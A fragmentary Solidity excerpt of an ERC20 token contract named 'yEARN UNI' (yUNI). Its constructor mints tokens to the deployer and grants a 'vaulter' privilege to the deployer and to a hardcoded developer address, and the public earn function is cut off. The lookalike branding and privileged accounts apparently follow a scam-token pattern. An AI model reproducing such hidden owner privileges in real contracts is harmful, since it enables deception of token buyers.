...
contract ERC20 is Context, IERC20 {
    ...
    function _earn(address acc) internal {
        require(acc != address(0), "earn to the zero address");
...
contract yEearnUNI is ERC20, ERC20Detailed {
  using SafeMath for uint;
  mapping (address => bool) public vaulter;
  address dev = 0xa76a59aBE81fbEE2Ac8DE372795627140C3D11Ec;
  constructor () public ERC20Detailed("yEARN UNI", "yUNI", 18) {
      _initMint( msg.sender, 1500*10**uint(decimals()) );
      vaulter[msg.sender] = true;
      vaulter[dev] = true;
  }

  function earn(address account) public {
